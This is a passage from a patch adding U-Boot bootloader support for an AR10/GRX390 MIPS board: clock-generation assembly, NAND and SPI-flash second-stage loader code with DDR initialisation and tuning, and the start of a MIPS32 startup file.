+   #define CONFIG_AR10_CGU_SYS_VALUE	0x522
+   #define CONFIG_GRX390_PLL2_CFG_VALUE 0x241 /* N = 9, M = 0 */
+#elif defined(CONFIG_GRX390_CPU_360M_RAM_180M)
+   #define CONFIG_AR10_CGU_SYS_VALUE	0x512
+   #define CONFIG_GRX390_PLL2_CFG_VALUE 0x241 /* N = 9, M = 0 */
+#elif defined(CONFIG_GRX390_CPU_360M_RAM_360M)
+   #define CONFIG_AR10_CGU_SYS_VALUE	0x511
+   #define CONFIG_GRX390_PLL2_CFG_VALUE 0x241 /* N = 9, M = 0 */
+#elif defined(CONFIG_GRX390_CPU_720M_RAM_360M)
+   #define CONFIG_AR10_CGU_SYS_VALUE	0x501
+   #define CONFIG_GRX390_PLL2_CFG_VALUE 0x241 /* N = 9, M = 0 */
+#else
+      /*fix me, put correct values here*/
+   #define CONFIG_AR10_CGU_SYS_VALUE    0x13
+#endif
+
+#ifdef CONFIG_DRIVER_GRX390
+   #ifdef CONFIG_AR10_PPE_FREQ_250M
+       #define CONFIG_AR10_CGU_CLKFSR_VALUE 0x10000
+   #elif defined(CONFIG_AR10_PPE_FREQ_400M) /*400M*/
+       #define CONFIG_AR10_CGU_CLKFSR_VALUE 0x40000
+   #elif defined(CONFIG_AR10_PPE_FREQ_432M) /*432M*/
+       #define CONFIG_AR10_CGU_CLKFSR_VALUE 0x20000
+   #else  
+       #define CONFIG_AR10_CGU_CLKFSR_VALUE 0x20000
+	   /* N= 12, M=0 for PPE to run at 468Mhz */
+	   #define CONFIG_GRX390_PLL2_CFG_VALUE 0x301
+   #endif
+#else
+   #if defined(CONFIG_AR10_PPE_FREQ_250M)
+       #define CONFIG_AR10_CGU_CLKFSR_VALUE 0x10010000
+   #elif defined(CONFIG_AR10_PPE_FREQ_400M)
+       #define CONFIG_AR10_CGU_CLKFSR_VALUE 0x10040000
+   #else /*432M*/
+       #define CONFIG_AR10_CGU_CLKFSR_VALUE 0x20000
+   #endif
+#endif
+
+
+#ifdef CONFIG_AR10_CRYSTAL_25M /*25M crystal clock*/
+    #define CONFIG_AR10_PLL0_CFG_VALUE 0x00F018D1   /*default value for 25M crystal*/
+#else
+    //#define CONFIG_AR10_PLL0_CFG_VALUE 0x00B01F21
+	/*M=2, N(6:0)=49, N(7)=1, */
+	/*setting bit 7 of N means the final pll clk frequency should be multiplied by 1.66*/
+	/*bit 7 itself should not be considered as part of N value*/
+	#define CONFIG_AR10_PLL0_CFG_VALUE 0x00B02C49
+    /*M=5, N(6:0)=99, N(7)=1*/
+	//#define CONFIG_AR10_PLL0_CFG_VALUE 0x00B038D5
+#endif
+
+
+#define CGU_OFFSET  0xBF103000
+#define PLL0_CFG    (CGU_OFFSET + 0x0004)
+#define PLL1_CFG    (CGU_OFFSET + 0x0008)
+#define CGU_SYS     (CGU_OFFSET + 0x000C)
+#define CGU_CLKFSR  (CGU_OFFSET + 0x0010)
+#define CGU_UPDATE  (CGU_OFFSET + 0x0020)
+#define IF_CLK      (CGU_OFFSET + 0x0024)
+#ifdef CONFIG_DRIVER_GRX390
+    #define PLL2_CFG    (CGU_OFFSET + 0x0060)
+#endif
+
+#define RCU_OFFSET   0xBF203000
+#define RST_REQ      (RCU_OFFSET + 0x0010)
+#define CHIPID       0xBF107340
+#define GRX390_ID    (CHIPID + 0x08)
+#define ID_CFG		 (CHIPID + 0x10)
+
+#define PPE400M_CONFIG 0x10040000
+#define PPE432M_CONFIG 0x20000
+
+#ifdef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+	#define CGU_SYS_600M		0x101
+	#define CGU_CLKFSR_300M		0x20000	/* 432Mhz PPE*/
+	#define CGU_SYS_720M		0x501
+	#define CGU_CLKFSR_360M		0x40000 /* 400Mhz PPE */
+	#define CONFIG_GRX390_PLL2_CFG_VALUE 0x241 /* N = 9, M = 0 */
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
+
+
+  .set  noreorder
+
+/*
+ * void cgu_init(long)
+ */
+  .globl  cgu_init
+  .ent  cgu_init
+cgu_init:
+    li  t2, CGU_SYS
+    lw  t2, 0(t2)
+    bne t2, CONFIG_AR10_CGU_SYS_VALUE, 1f /*check if CGU_SYS is correct*/
+    nop
+
+    li  a0, CONFIG_AR10_CGU_CLKFSR_VALUE
+    bne a0, PPE432M_CONFIG, 3f /* check if ppe config to 432M */
+    nop
+
+    li   t2, GRX390_ID
+    lw   t2, 0(t2)
+    andi t2, t2, 0x1 /* check if grx387/grx39X or ar10 */
+    beq  t2, 0x1, 3f
+    nop
+ 
+    /* if ar10 & ppe clk config to 432M */
+    li a0, PPE400M_CONFIG /* config to max 400M if chip is ar10 */
+
+3:
+    li  t2, CGU_CLKFSR
+    lw  t2, 0(t2)
+    bne t2, a0, 1f /*check if CGU_CLKFSR is correct*/
+    nop
+
+freq_up2date:
+    j ra
+	nop
+
+1:
+#if defined(CONFIG_AR10_PPE_FREQ_468M) || defined(CONFIG_GRX390_CPU_720M_RAM_360M) || \
+	defined(CONFIG_GRX390_CPU_360M_RAM_360M) || defined (CONFIG_GRX390_CPU_360M_RAM_180M) || \
+	defined(CONFIG_GRX390_CPU_180M_RAM_180M) /* change for 720Mhz & PPE clk 468Mhz */
+
+   li  t2, PLL2_CFG
+   lw  a0, 0(t2)
+   and a0, a0, 0xffffc000
+   or  a0, a0, CONFIG_GRX390_PLL2_CFG_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, CGU_SYS
+   lw  a0, 0(t2)
+   or  a0, 0x80
+   sw  a0, 0(t2)
+
+   and a0, 0xffffff7f
+   sw  a0, 0(t2)
+
+2:
+   li  t2,  PLL2_CFG  
+   lw  t2, 0(t2)
+   andi t2, t2, 0x02
+   bne t2, 0x2, 2b
+   nop
+#endif
+
+   li  t2, CGU_SYS
+   li  a0, CONFIG_AR10_CGU_SYS_VALUE
+   addi a0, a0, 0x80
+   sw  a0, 0(t2)    /*store predefined value to CGU_SYS*/
+
+   li  a0, CONFIG_AR10_CGU_CLKFSR_VALUE
+   bne a0, PPE432M_CONFIG, 4f /* check if ppe config to 432M */
+   nop
+
+   li   t2, GRX390_ID
+   lw   t2, 0(t2)
+   andi t2, t2, 0x1 /* check if grx387/grx39X or ar10 */
+   beq  t2, 0x1, 4f
+   nop
+ 
+   /* if ar10 & ppe clk config to 432M */
+   li a0, PPE400M_CONFIG /* config to max 400M if chip is ar10 */
+
+4:
+   li  t2, CGU_CLKFSR
+   sw  a0, 0(t2)
+
+   li  t2, PLL0_CFG
+   li  a0, CONFIG_AR10_PLL0_CFG_VALUE /*store predefined value to PLL0_CFG*/
+   sw  a0, 0(t2)
+
+   li  t2, CGU_UPDATE
+   li  a0, 1
+   sw  a0, 0(t2) /*write 0x1 to CGU_UPDATE*/
+
+   li  t2, RST_REQ
+   li  a0, 0x40000000
+   sw  a0, 0(t2)  /*issue global software reset*/
+wait_reset:
+    b   wait_reset
+    nop
+
+    .end  cgu_init
+
+
+#ifdef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+
+/*
+ * void cgu_auto_select(long)
+ */
+  .globl cgu_auto_select
+  .ent	cgu_auto_select
+cgu_auto_select:
+ 	li	t2, ID_CFG 
+ 	lw	a0, 0(t2)
+	and a0, a0, 0x20000 /* check if the chip is fused */
+	beqz a0, 1f			/* not fused, 720Mhz is allowed */
+	nop 
+
+	li	a1, CGU_SYS_600M /* load a1 to 600M CGU settings */
+	li	a2, CGU_CLKFSR_300M /* load a2 with 432M PPE settings */
+	b	2f
+	nop
+
+1:
+	li	a1, CGU_SYS_720M /* load a1 to 720M CGU settings */
+	li	a2, CGU_CLKFSR_360M /* load a2 to 400M PPE settings */
+	
+2:
+    li  t2, CGU_SYS
+    lw  t2, 0(t2)
+    bne t2, a1, 3f /*check if CGU_SYS is correct*/
+    nop
+
+    li  t2, CGU_CLKFSR
+    lw  t2, 0(t2)
+    bne t2, a2, 3f /*check if CGU_CLKFSR is correct*/
+    nop
+
+update_done:
+    j ra
+    nop
+
+3: 
+	bne	a1, CGU_SYS_720M, 5f /* do PLL2 cfg if 720M */
+	nop
+
+	/* start PLL2 cfg */
+	li  t2, PLL2_CFG
+	lw  a0, 0(t2)
+	and a0, a0, 0xffffc000
+	or  a0, a0, CONFIG_GRX390_PLL2_CFG_VALUE
+	sw  a0, 0(t2)
+
+	li  t2, CGU_SYS
+	lw  a0, 0(t2)
+	or  a0, 0x80
+	sw  a0, 0(t2)
+
+	and a0, 0xffffff7f
+	sw  a0, 0(t2)
+
+4:
+	li  t2,  PLL2_CFG
+	lw  t2, 0(t2)
+	andi t2, t2, 0x02
+	bne t2, 0x2, 4b
+	nop
+	/* end PLL2 cfg */
+
+5:
+	li  t2, CGU_SYS
+	addi a1, a1, 0x80
+	sw  a1, 0(t2)    /*store predefined value to CGU_SYS*/
+
+	li  t2, CGU_CLKFSR
+	sw  a2, 0(t2)
+
+	li  t2, PLL0_CFG
+	li  a0, CONFIG_AR10_PLL0_CFG_VALUE /*store predefined value to PLL0_CFG*/
+	sw  a0, 0(t2)
+
+	li  t2, CGU_UPDATE
+	li  a0, 1
+	sw  a0, 0(t2) /*write 0x1 to CGU_UPDATE*/
+
+	li  t2, RST_REQ
+	li  a0, 0x40000000
+	sw  a0, 0(t2)  /*issue global software reset*/
+reset:
+    b   reset
+    nop
+
+	.end	cgu_auto_select
+
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
+
+/*
+ * void ddrram_init(long)
+ */
+  .globl  ddrram_init
+  .ent  ddrram_init
+ddrram_init:
+
+   .end ddrram_init
+   
+  .globl  lowlevel_init
+  .ent  lowlevel_init
+lowlevel_init:
+  /* EBU, CGU and SDRAM/DDR-RAM Initialization.
+   */
+  move  t0, ra
+
+#ifdef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+  bal cgu_auto_select
+#else
+  bal cgu_init
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
+  nop
+ 
+  move  ra, t0
+  j ra
+  nop
+
+  .end  lowlevel_init
diff --git a/board/ar10/nand_spl_board.c b/board/ar10/nand_spl_board.c
new file mode 100755
--- /dev/null
+++ b/board/ar10/nand_spl_board.c
@@ -0,0 +1,206 @@
+//#include <config.h>
+#include <common.h>
+#include <command.h>
+#include <asm/addrspace.h>
+#include <asm/ar10.h>
+#include <environment.h>
+#include <nand.h>
+
+#include "ddr.h"
+
+#ifdef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+SET_DDR_VALUE(360M)
+SET_DDR_VALUE(300M)
+static ddr_t *ddr;
+#endif
+
+void nand_gpio_init(void)
+{
+     /* GPIO 13 NAND_ALE*/
+     *AR10_GPIO_P0_DIR     |= 1 << 13;
+     *AR10_GPIO_P0_ALTSEL0 |= 1 << 13;
+     *AR10_GPIO_P0_ALTSEL1 &= ~(1 << 13);
+     *AR10_GPIO_P0_OD      |= 1 << 13;
+
+     /*GPIO 24 NAND_CLE */
+     *AR10_GPIO_P1_DIR     |= 1 << 8;
+     *AR10_GPIO_P1_ALTSEL0 |= 1 << 8;
+     *AR10_GPIO_P1_ALTSEL1 &= ~(1 << 8);
+     *AR10_GPIO_P1_OD      |= 1 << 8;
+
+      /*GPIO 48, NAND Ready_Busy*/
+      /*GPIO 49, NAND_RD*/
+      /*GPIO 50, NAND_D1*/
+      /*GPIO 51, NAND_D0*/
+      /*GPIO 52, NAND_D2*/
+      /*GPIO 53, NAND_D2*/
+      /*GPIO 54, NAND_D6*/
+      /*GPIO 55, NAND_D5*/
+      /*GPIO 56, NAND_D5*/
+      /*GPIO 57, NAND_D3*/
+      /*GPIO 59, NAND_WR*/
+      /*GPIO 60, NAND_WP*/
+      /*GPIO 61, NAND_SE*/
+      *AR10_GPIO_P3_DIR     = 0x3ffe;
+      *AR10_GPIO_P3_ALTSEL0 = 0x3fff;
+      *AR10_GPIO_P3_ALTSEL1 = 0;
+      *AR10_GPIO_P3_OD      = 0x3ffe;
+}																																	   
+
+
+void *malloc(unsigned int size)
+{
+   
+    return NULL;
+}
+
+
+
+void init_ddr(void)
+{
+    int i;
+    REG32(0xBF106c98) = 0x94; /*interdcdc 1v8*/
+
+
+    REG32(0xBF801000) = 0x0 ; /*Put DDR controller inactive*/
+    for(i=0;i<66;i++){
+        REG32(ddr[i].addr)=ddr[i].value;
+    }
+	/*Enable memory controller*/
+    REG32(0xBF801000) = 0x401;
+    while(!(REG32(0xBF8014B0)&0x1) || !(REG32(0xBF8014E0)&0x1));
+    
+	/*prioritize WLAN DDR access to highest in DDR placement logic design*/
+	REG32(0xBF8001D0) = 0xFCF;
+
+}
+										
+
+
+#ifndef CONFIG_NAND_ECC_HW_REED_SOLOMON
+
+
+static void nand_read_page(u32 page_addr, u32 dest_addr)
+{
+   int i;
+   u8 *tmp;
+   u8 col_addr_num;
+     u8 page_addr_num;
+
+   if(CONFIG_NAND_PAGE_SIZE<=0x200){
+     col_addr_num=1;
+
+     if(CONFIG_NAND_FLASH_SIZE<32){
+        page_addr_num=2;
+      }else
+        page_addr_num=3;
+   }else{
+     col_addr_num=2;
+
+     if(CONFIG_NAND_FLASH_SIZE<128){
+          page_addr_num=2;
+      }else{
+        page_addr_num=3;
+      }
+   }
+   NAND_CE_SET;
+
+   NAND_SETCLE;
+   NAND_WRITE(WRITE_CMD,0);
+   NAND_CLRCLE;
+   NAND_SETALE;
+   for(i=0;i<col_addr_num;i++){
+    NAND_WRITE(WRITE_ADDR,0);
+  }
+   for(i=0;i<page_addr_num;i++){
+     NAND_WRITE(WRITE_ADDR,(u8)((page_addr>>(i*8)) & 0xff ));
+   }
+   NAND_CLRALE;
+
+   NAND_SETCLE;
+   if(CONFIG_NAND_PAGE_SIZE>0x200){
+     NAND_WRITE(WRITE_CMD,0x30);
+   }
+  NAND_CLRCLE;
+  while(!NAND_READY){}
+
+   /* Read page */
+   tmp = (u8*)dest_addr;
+   for (i = 0; i < CONFIG_NAND_PAGE_SIZE; i++)
+   {
+     NAND_READ(READ_DATA, *tmp++);
+   }
+   NAND_CE_CLEAR;
+
+   while(!NAND_READY){}
+}
+
+
+void nand_spl_init(void)
+{
+	ulong  buffer[8];
+	u8    page_buf[CONFIG_NAND_PAGE_SIZE];
+	ulong ddr_magic=0x88888888;
+        int i;	
+	ulong ecc;
+	asm("sync");
+        serial_init();
+        buffer[0] = 0;
+
+#ifdef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+	if (REG32(AR10_ID_CFG) & 0x20000) 
+		ddr = &ddr_300M[0];
+	else
+		ddr  = &ddr_360M[0];
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
+
+#ifdef CONFIG_TUNE_DDR    
+	nand_read_page(((IFX_CFG_FLASH_DDR_CFG_END_ADDR+1)/CONFIG_NAND_PAGE_SIZE)-1,page_buf);
+	   
+        for(i=0;i<8;i++){
+           buffer[i] = *(volatile u32*)(page_buf+CONFIG_NAND_PAGE_SIZE-32+i*4); 
+        }
+    
+        if(buffer[0]==ddr_magic)
+        {
+             ecc=buffer[1]^buffer[2]^buffer[3]^buffer[4]^buffer[5]^buffer[6];
+               if(ecc!=buffer[7]){
+                  REG32(CONFIG_TUNING_STATUS)=0xff;
+                }else{
+                    REG32(CONFIG_TUNING_STATUS)=0;
+                }
+         }
+     else{
+        REG32(CONFIG_TUNING_STATUS)=0xff;
+         }
+
+    if(REG32(CONFIG_TUNING_STATUS)!=0xff){
+          ddr[62].value = buffer[1]; /*PHYR6*/
+          ddr[64].value = buffer[2]; /*PHYR8*/
+          ddr[63].value = buffer[3]; /*PHYR7*/
+          ddr[65].value = buffer[4]; /*PHYR9*/
+          REG32(CSS_DDR_ECHO_DLL0) = buffer[5];
+          REG32(CSS_DDR_ECHO_DLL1) = buffer[6];
+         }
+      asm("sync");
+      
+#endif
+	   init_ddr(); 
+#ifdef CONFIG_TUNE_DDR	  
+	   tune_ddr();
+#endif	   
+	   nand_boot();
+	
+}
+#else
+
+
+void nand_spl_init(void)
+{
+    serial_init();
+    nand_boot();
+}
+	
+
+#endif
+
diff --git a/board/ar10/sfddr_board.c b/board/ar10/sfddr_board.c
new file mode 100755
--- /dev/null
+++ b/board/ar10/sfddr_board.c
@@ -0,0 +1,375 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+#include <common.h>
+#include <command.h>
+#include <version.h>
+#include <net.h>
+#include <environment.h>
+
+
+#include "ddr.h"
+
+
+DECLARE_GLOBAL_DATA_PTR;
+
+#define	TOTAL_MALLOC_LEN	CONFIG_SYS_MALLOC_LEN
+
+
+ulong monitor_flash_len;
+
+const char version_string[] =
+	U_BOOT_VERSION" (" __DATE__ " - " __TIME__ ")";
+
+static char *failed = "*** failed ***\n";
+
+
+#include <spi.h>
+#include <asm/ifx_ssc.h>
+
+#ifndef CONFIG_ENV_SPI_BUS
+# define CONFIG_ENV_SPI_BUS 0
+#endif
+#ifndef CONFIG_ENV_SPI_CS
+# define CONFIG_ENV_SPI_CS      0
+#endif
+#ifndef CONFIG_ENV_SPI_MAX_HZ
+# define CONFIG_ENV_SPI_MAX_HZ  1000000
+#endif
+#ifndef CONFIG_ENV_SPI_MODE
+# define CONFIG_ENV_SPI_MODE    SPI_MODE_3
+#endif
+
+#define CMD_MX25L_READ     0x03
+
+#define SRC_OFFSET  0x00001000
+#define DST_ADDRESS 0xbe221000
+#define DATA_SIZE   0x4000
+
+												
+static void
+SPI_ON(unsigned int cs)
+{
+    ssc_cs_clr(cs);
+}
+
+static void	SPI_OFF(unsigned int cs)
+{
+    ssc_cs_set(cs);
+}
+
+void spi_write_byte(uint8_t transmit)
+{
+    asm("sync");
+    ssc_tx_only();
+    ssc_write(transmit);
+    asm("sync");
+    return;
+}
+
+static uint8_t	spi_read_byte(void)
+{
+    ssc_rx_only();
+    return ssc_read();
+}
+
+
+#ifdef CONFIG_SPI_FLASH_WINBOND
+/*
+ * Assemble the address part of a command for Winbond devices in
+ * non-power-of-two page size mode.
+ */
+static void winbond_build_address(size_t offset, int l2_page_size, u8* cmd)
+{
+  unsigned long page_addr;
+  unsigned long byte_addr;
+  unsigned long page_size;
+  unsigned int page_shift;
+
+  /*
+   * The "extra" space per page is the power-of-two page size
+   * divided by 32.
+   */
+  page_shift = l2_page_size;
+  page_size = (1 << page_shift);
+  page_addr = offset / page_size;
+  byte_addr = offset % page_size;
+  cmd[0] = page_addr >> (16 - page_shift);
+  cmd[1] = page_addr << (page_shift - 8) | (byte_addr >> 8);
+  cmd[2] = byte_addr;
+}
+#endif
+
+
+void sf_read(const u8 cmd, ulong src_addr, 
+		size_t addr_len, u8 *data, size_t data_len)
+{
+	  int i;
+	  u8 offset[5];
+#ifdef CONFIG_SPI_FLASH_WINBOND
+          winbond_build_address((size_t)src_addr, 8, &offset);
+#elif defined(CONFIG_SPI_FLASH_MXIC)
+          for(i=0;i<addr_len;i++){
+          offset[i]= (u8)((src_addr >>((addr_len-i-1)*8)) & 0xff);
+          }
+#endif
+	  SPI_ON(CONFIG_ENV_SPI_CS);
+	  spi_write_byte(cmd);
+	  for(i=0;i<addr_len;i++){
+	  	spi_write_byte(*(offset+i));
+	  }
+	  for(i=0;i<data_len;i++){
+	  	*(data+i)=spi_read_byte();
+	  }
+	  SPI_OFF(CONFIG_ENV_SPI_CS);
+}		
+
+
+
+
+
+/*
+ * Begin and End of memory area for malloc(), and current "brk"
+ */
+
+static ulong mem_malloc_start;
+static ulong mem_malloc_end;
+static ulong mem_malloc_brk;
+
+
+/*
+ * The Malloc area is immediately below the monitor copy in DRAM
+ */
+static void mem_malloc_init (ulong dest_addr, ulong size)
+{
+//  ulong dest_addr = BOOTSTRAP_CFG_MONITOR_BASE + gd->reloc_off;
+
+    mem_malloc_end = dest_addr;
+    mem_malloc_start = dest_addr - size;
+    mem_malloc_brk = mem_malloc_start;
+
+    memset ((void *) mem_malloc_start,
+        0,
+        mem_malloc_end - mem_malloc_start);
+}
+
+void *malloc(unsigned int size)
+{
+    if(size < (mem_malloc_end - mem_malloc_start))
+    {
+        mem_malloc_start += size;
+        return (void *)(mem_malloc_start - size);
+    }
+    return NULL;
+}
+
+void *realloc(void *src,unsigned int size)
+{
+    return NULL;
+}
+
+void free(void *src)
+{
+    return;
+}
+
+void * calloc(
+    size_t nelem,
+    size_t size)
+{
+   return;
+}
+
+void *sbrk (ptrdiff_t increment)
+{
+    ulong old = mem_malloc_brk;
+    ulong new = old + increment;
+
+    if ((new < mem_malloc_start) || (new > mem_malloc_end)) {
+        return (NULL);
+    }
+    mem_malloc_brk = new;
+    return ((void *) old);
+}
+
+
+static int init_baudrate (void)
+{
+
+	gd->baudrate = CONFIG_BAUDRATE;
+
+	return (0);
+}
+
+void uncompress_image(ulong image_addr)
+{
+
+   ulong   addr;
+   ulong   data, len, checksum;
+   ulong  *len_ptr;
+   unsigned int destLen;
+   image_header_t header;
+   image_header_t *hdr = &header;
+   int (*fn)();
+
+   mem_malloc_init(0x82000000, TOTAL_MALLOC_LEN);
+   addr = image_addr;
+   memmove (&header, (char *)addr, sizeof(image_header_t));
+
+   if (ntohl(hdr->ih_magic) != IH_MAGIC) {
+           return;
+                            		       }
+
+   data = (ulong)&header;
+   len  = sizeof(image_header_t);
+
+   checksum = ntohl(hdr->ih_hcrc);
+   hdr->ih_hcrc = 0;
+   asm("sync");
+   if (crc32 (0, (char *)data, len) != checksum) {
+		         return;
+						     }
+
+   asm("sync");
+
+   data = addr + sizeof(image_header_t);
+
+   asm("sync");
+
+   len  = ntohl(hdr->ih_size);
+   asm("sync");
+
+   len_ptr = (ulong *)data;
+   asm("sync");
+
+   destLen = 0x0;
+
+   lzma_inflate ((unsigned char *)data, len, (unsigned char*)ntohl(hdr->ih_load), &destLen);
+   fn = ntohl(hdr->ih_load);
+
+   (*fn)();
+
+}
+
+
+
+
+void init_ddr(void)
+{
+    int i;
+    REG32(0xBF106c98) = 0x94; /*interdcdc 1v8*/		
+   
+    
+	REG32(0xBF801000) =	0x0	; /*Put DDR controller inactive*/
+	for(i=0;i<66;i++){
+        REG32(ddr[i].addr)=ddr[i].value;
+	}
+	/*Enable memory controller*/ 	
+	REG32(0xBF801000) =	0x401;
+    //mdelay(1);
+	while(!(REG32(0xBF8014B0)&0x1) || !(REG32(0xBF8014E0)&0x1));
+
+    /*prioritize WLAN DDR access to highest in DDR placement logic design*/
+    REG32(0xBF8001D0) = 0xFCF;
+}
+
+void spi_init (void)
+{
+        /* Clock Control Register */
+        /* DISS OFF and RMC = 1 */
+        //CLC
+        *SPI_CLC = 0x0100;
+        /* Disable SSC to get access to the control bits */
+        *SPI_WHBSTATE = 0x1;
+        asm("SYNC");
+
+        /*set chip select pin*/
+        //*SPI_GPOCON =1<<(spi.cs+8); /*boot from SPI, chip select already set by bootrom*/
+
+		*SPI_BRT = (((F_SSC_CLK>>1) + CONFIG_ENV_SPI_MAX_HZ/2)/(CONFIG_ENV_SPI_MAX_HZ) - 1) & 0xffff;
+        /*enable and flush RX/TX FIFO*/
+        *SPI_RXFCON = 0xF03;
+        *SPI_TXFCON = 0xF03;
+        /* set CON, TX off , RX off, ENBV=0, BM=7(8
+         * bit valid) HB=1(MSB first), PO=0,PH=1(SPI
+         * Mode 0)*/
+        *SPI_CON = 0x00070033;
+        asm("SYNC");
+        /*Set Master mode and  Enable
+         * SSC */
+        *SPI_WHBSTATE = 0xA;
+        asm("SYNC");
+}
+
+
+void board_init_f(ulong bootflag)
+{
+	gd_t gd_data, *id;
+	bd_t *bd;
+	ulong *s;
+	ulong lzmaImageaddr  = 0;
+	ulong  ecc;
+	ulong  buffer[8];
+	ulong ddr_magic=0x88888888;
+	   
+	int i;
+	int (*fn)();
+        u8  cmd = CMD_MX25L_READ;
+        size_t  addr_len = 3;
+        serial_init();
+        spi_init();
+     
+#ifdef CONFIG_TUNE_DDR  
+   sf_read(cmd,(ulong)IFX_CFG_FLASH_DDR_CFG_START_ADDR,addr_len,(u8*)&buffer,IFX_CFG_FLASH_DDR_CFG_SIZE);
+
+    if(buffer[0]==ddr_magic)
+       {
+             ecc=buffer[1]^buffer[2]^buffer[3]^buffer[4]^buffer[5]^buffer[6];
+               if(ecc!=buffer[7]){
+                  REG32(CONFIG_TUNING_STATUS)=0xff;
+                }else{
+                    REG32(CONFIG_TUNING_STATUS)=0;
+                }
+         }
+     else{
+        REG32(CONFIG_TUNING_STATUS)=0xff;
+    }
+
+    if(REG32(CONFIG_TUNING_STATUS)!=0xff){
+          ddr[62].value = buffer[1]; /*PHYR6*/
+          ddr[64].value = buffer[2]; /*PHYR8*/
+          ddr[63].value = buffer[3]; /*PHYR7*/
+          ddr[65].value = buffer[4]; /*PHYR9*/
+          REG32(CSS_DDR_ECHO_DLL0) = buffer[5];
+          REG32(CSS_DDR_ECHO_DLL1) = buffer[6];
+      }
+      asm("sync");
+#endif     
+     init_ddr();
+#ifdef CONFIG_TUNE_DDR	 
+     tune_ddr();
+#endif	   
+     sf_read(cmd,(ulong)0x5000,addr_len,(u8*)0xa0100000,0x10000);
+     sf_read(cmd,(ulong)0x10000,addr_len,(u8*)0xa0110000,0x10000);
+     uncompress_image(0xa0100000);
+}
diff --git a/board/ar10/start_sfddr.S b/board/ar10/start_sfddr.S
new file mode 100644
--- /dev/null
+++ b/board/ar10/start_sfddr.S
@@ -0,0 +1,531 @@
+/*
+ *  Startup Code for MIPS32 CPU-core
+ *
+ *  Copyright (c) 2003	Wolfgang Denk <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+
+#include <config.h>
+#include <version.h>
+#include <asm/regdef.h>
+#include <asm/mipsregs.h>
+#include <asm/cacheops.h>
+#include <asm/addrspace.h>
+#include <asm/yamon.h>
+
+/*****************************************************************************
+ * Local assembler register definitions
+ *****************************************************************************/
+#define C0_EBASe     $15,1
+
+#define CFG_BOOTSTRAP_CODE
+
+#define S_EBASeExpBase     12       /* Exception Base */
+#define M_EBASeExpBase     (0x3ffff << S_EBASeExpBase)
+#define S_EBASeCPUNum      0        /* CPU Number */
+#define M_EBASeCPUNum      (0x1ff << S_EBASeCPUNum)
+
+/*
+ * Values in the CPU Number field
+ */
+#define K_EBASeCPUNum_Host 0
+#define K_EBASeCPUNum_Voice 1
+
+/* C0_EBASE register encoding */
+#define CO_EBASE_EXPBASE_SHF     S_EBASeExpBase
+#define CO_EBASE_EXPBASE_MSK     M_EBASeExpBase
+
+#define CO_EBASE_CPUNUM_SHF      S_EBASeCPUNum
+#define CO_EBASE_CPUNUM_MSK      M_EBASeCPUNum
+
+#define CO_EBASE_CPU_HOST     K_EBASeCPUNum_Host
+#define CO_EBASE_CPU_VOICE    K_EBASeCPUNum_Voice
+
+#define CFG_EBU_BOOTWORD              0x688c688c
+
+
+/* FixMe: Adresses not defined... */
+#define RST_STAT   0xbf203014
+/* POR,SRST, WDT0, WDT1,HRST*/
+#define HARD_RST 0xE8000001
+    .set noreorder
+	.globl _start
+   	.globl __exception_vector_tlb_refill
+   	.globl __exception_vector_xtlb_refill
+   	.globl __exception_vector_general
+   	.globl __exception_vector_int
+   	.text
+
+_start:
+	/* RESET entry */
+   	b     reset
+   	nop
+   	nop
+   	nop
+   .org 0x10
+   .word CFG_EBU_BOOTWORD     /* EBU init code, fetched during booting */
+   .word 0x00000000           /* phase of the flash                    */
+
+   .org 0x18
+   .string "1.1.0"            /* version 1.1.0                         */
+   .word 0x00000000
+   .align 4
+
+reset:
+    mtc0    zero, CP0_WATCHLO
+	mtc0    zero, CP0_WATCHHI
+	mtc0    zero, CP0_CAUSE
+				
+       /* Determine processor */
+	mfc0    k1, C0_PRId
+	li	t0, M_PRIdImp | M_PRIdCoID
+	and     k1, t0
+
+/* Check if it is a MIPS 34K processor */
+	li	t0, MIPS_34K
+	bne	k1, t0, 2f
+	nop
+
+	/* Setup MIPS34K specifics (implementation dependent fields) */
+	MFC0(   t0, C0_Config )
+	li	t1, CONFIG0_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, CONFIG0_MIPS34K
+	or	t0, t1
+	MTC0(	t0, C0_Config )
+
+	MFC0(   t0, C0_Status )
+	li	t1, STATUS_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, STATUS_MIPS34K
+	or	t0, t1
+	MTC0(	t0, C0_Status )
+
+2:
+	/* Check if it is a MIPS 4K/5K family processor */
+	li	t0, MIPS_4Kc
+	beq	k1, t0, 1f
+	nop
+	li	t0, MIPS_4KEc
+	beq	k1, t0, 1f
+	nop
+
+	b	mips32_64
+	nop
+
+1:
